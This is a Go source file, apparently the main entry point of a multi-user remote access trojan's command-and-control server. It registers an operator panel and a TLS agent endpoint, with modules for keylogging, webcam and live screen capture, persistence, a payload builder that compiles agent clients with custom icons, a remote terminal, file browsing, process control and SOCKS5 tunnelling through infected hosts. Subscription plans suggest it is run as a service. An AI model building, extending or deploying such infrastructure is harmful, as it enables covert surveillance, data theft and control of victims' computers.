package main

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"

    "agentmanager/modules/admin"
    "agentmanager/modules/agentkey"
    "agentmanager/modules/apperr"
    "agentmanager/modules/attachments"
    "agentmanager/modules/auth"
    "agentmanager/modules/builder"
    "agentmanager/modules/config"
    "agentmanager/modules/dbutil"
    "agentmanager/modules/logger"
    "agentmanager/modules/agents"
    "agentmanager/modules/apps/controlpanel"
    "agentmanager/modules/apps/fileexplorer"
    "agentmanager/modules/apps/keylog"
    "agentmanager/modules/apps/latency"
    "agentmanager/modules/apps/liveview"
    "agentmanager/modules/apps/logs"
    "agentmanager/modules/apps/payload"
    "agentmanager/modules/apps/persistence"
    "agentmanager/modules/apps/procs"
    "agentmanager/modules/apps/socks5"
    "agentmanager/modules/apps/system"
    "agentmanager/modules/apps/terminal"
	"agentmanager/modules/apps/webcam"
    "agentmanager/modules/message"
    "agentmanager/modules/panelapp"
    "agentmanager/modules/plan"
	"agentmanager/modules/ratelimit"
	"agentmanager/modules/router"
	"agentmanager/modules/session"
	"agentmanager/modules/user"
	"agentmanager/modules/wsutil"
)

func main() {
	e := echo.New()
	e.HideBanner = true
	e.HidePort = true
	e.Use(middleware.Recover())
	e.Use(middleware.GzipWithConfig(middleware.GzipConfig{Level: 5}))
	e.Use(ratelimit.PerIP(ratelimit.PanelConfig()))
	e.Use(logger.HTTPMiddleware("panel"))
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins:     config.AllowedDomains(),
		AllowCredentials: true,
	}))
	e.RouteNotFound("/*", func(c echo.Context) error {
		if strings.HasPrefix(c.Request().URL.Path, config.APIPrefix) {
			return apperr.NotFound(c)
		}
		return c.File("assets/public/index.html")
	})

	db, err := dbutil.New(dbutil.DefaultConfig())
	if err != nil {
		logger.Fatal(err.Error())
	}
	defer db.Close()

	userSvc := user.NewService(db)
	authSvc := auth.NewService(db, auth.DefaultConfig(), userSvc, nil)
	agentKeySvc := agentkey.NewService(db)

	admins.Resolve(func(username string) (string, bool) {
		id, _, ok := userSvc.GetCredentials(username)
		return id, ok
	})

	authSvc.SetOnRegister(func(uid string) error {
		_, err := agentKeySvc.Rotate(uid)
		return err
	})

	attCfg := attachments.DefaultConfig()
	attCfg.MasterKey = config.MasterKey
	attachSvc, err := attachments.NewService(db, attCfg)
	if err != nil {
		logger.Fatal(err.Error())
	}

	r := router.New(e, config.APIPrefix, authSvc.RequireAuth, nil)
	r.RegisterModule(authSvc)
	r.RegisterModule(userSvc)
	r.RegisterModule(agentKeySvc)
	r.RegisterModule(attachSvc)

	r.Static("/js", "assets/public/js")
	r.Static("/css", "assets/public/css")
	r.Static("/media", "assets/public/media")
	e.File("/", "assets/public/index.html")
	e.Static("/files", "public/files")

	logger.RegisterPort("panel", "PANEL :8080")
	logger.RegisterPort("agent", "AGENT :9090")

	panelHub := wsutil.NewHub(wsutil.DefaultConfig())
	panelHub.SetTagger(auth.UserIDFromContext)

	planSvc := plan.NewService(db, panelHub)
	authSvc.SetPlan(planSvc)
	r.RegisterModule(planSvc)
	r.Register(router.RouteConfig{Method: "GET", Path: config.APIPrefix + "/ws", Handler: panelHub.HandleConnect, Auth: true})

	sessReg := session.New()

	agentCfg := wsutil.DefaultConfig()
	agentCfg.EnableProbe = true
	hub := wsutil.NewHub(agentCfg)
	hub.SetTagger(agentkey.Tagger)
	hub.SetConnectLogger(func(id, ip string) {
		if id == "" {
			logger.PortLog("agent", logger.LevelWarn, "WS", "upgrade failed from "+ip)
		} else {
			logger.PortLog("agent", logger.LevelInfo, "CONN", id+" "+ip+" connected")
		}
	})
	hub.SetDisconnectLogger(func(id string) {
		logger.PortLog("agent", logger.LevelInfo, "DISC", id+" disconnected")
	})
	agentKeySvc.SetOnRotate(hub.CloseByTag)

	agentsSvc := agents.NewService(db, hub, panelHub)
	r.RegisterModule(agentsSvc)
    messageSvc := message.NewService(db, message.DefaultConfig(), hub, panelHub, agentsSvc, sessReg, attachSvc)

    panelApp := &panelapp.App{
        Agent: hub,
        Panel: panelHub,
        Reg:   agentsSvc,
        Sess:  sessReg,
        Plan:  planSvc,
    }
    fileexplorer.NewService(panelApp)
    terminal.NewService(panelApp)
    procs.NewService(panelApp)
    system.NewService(panelApp)
    controlpanel.NewService(panelApp)
    keylog.NewService(panelApp)
    liveview.NewService(panelApp)
    socks5.NewService(panelApp)
    logs.NewService(panelApp)
    persistence.NewService(panelApp)
    payload.NewService(panelApp)
    latencySvc := latency.NewService(panelApp)
    webcam.NewService(panelApp)
    panelHub.SetOnDisconnect(func(connID string) {
        emptied := sessReg.Remove(connID)
        for _, topic := range emptied {
            if strings.HasPrefix(topic, "webcam:") {
                agentID := strings.TrimPrefix(topic, "webcam:")
                for _, conn := range agentsSvc.ConnsFor(agentID) {
                    hub.EmitTo(conn, "cam_stop", nil)
                }
                continue
            }
            if !strings.HasPrefix(topic, "liveview:") {
                continue
            }
            agentID := strings.TrimPrefix(topic, "liveview:")
            for _, conn := range agentsSvc.ConnsFor(agentID) {
                hub.EmitTo(conn, "liveview_stop", map[string]interface{}{"sess_id": ""})
            }
        }
    })
    agentsSvc.SetOnPingCb(func(connID, agentID string, ms int) {
        latencySvc.HandlePing(connID, ms)
    })
	r.RegisterModule(messageSvc)

	builderSvc := builder.NewService("agentclient", "agentclient/builds", "agentclient/icons", agentKeySvc.RawKey, panelHub, planSvc)
	builderHandler := builder.NewHandler(builderSvc)
	r.RegisterModule(builderHandler)

	ea := echo.New()
	ea.HideBanner = true
	ea.HidePort = true
	ea.Use(middleware.Recover())
	ea.Use(ratelimit.PerIP(ratelimit.AgentConfig()))
	ea.Use(logger.HTTPMiddleware("agent"))
	ea.GET("/ws", hub.HandleConnect, agentKeySvc.Guard)
	ea.GET("/tunnel", func(c echo.Context) error {
		userID := agentkey.Tagger(c)
		if userID == "" {
			return c.NoContent(http.StatusUnauthorized)
		}
		conn, bufrw, err := c.Response().Hijack()
		if err != nil {
			return err
		}
		bufrw.WriteString("HTTP/1.1 101 Switching Protocols\r\nUpgrade: tunnel\r\nConnection: Upgrade\r\n\r\n")
		bufrw.Flush()
        go socks5.HandleTunnel(userID, conn)
		return nil
	}, agentKeySvc.Guard)
	ea.GET("/bandwidth", func(c echo.Context) error {
		size := 10 * 1024 * 1024 // 10MB
		c.Response().Header().Set("Content-Type", "application/octet-stream")
		c.Response().Header().Set("Content-Length", fmt.Sprintf("%d", size))
		buf := make([]byte, size)
		return c.Blob(200, "application/octet-stream", buf)
	}, agentKeySvc.Guard)
	ea.POST(config.APIPrefix+"/attachments", attachSvc.Upload, agentKeySvc.Guard)
	ea.GET(config.APIPrefix+"/attachments/:id", attachSvc.Download, agentKeySvc.Guard)

	go func() {
		agentAddr := config.AgentHost() + ":" + config.AgentPort()
		logger.PortLog("agent", logger.LevelInfo, "START", "agent wss listening on "+agentAddr)
		if err := ea.StartTLS(agentAddr, config.CertFile(), config.KeyFile()); err != nil && err != http.ErrServerClosed {
			logger.Fatal(err.Error())
		}
	}()

	addr := config.PanelHost() + ":" + config.PanelPort()
	logger.PortLog("panel", logger.LevelInfo, "START", "panel listening on "+addr)

	if err := e.Start(addr); err != nil && err != http.ErrServerClosed {
		logger.Fatal(err.Error())
	}
}
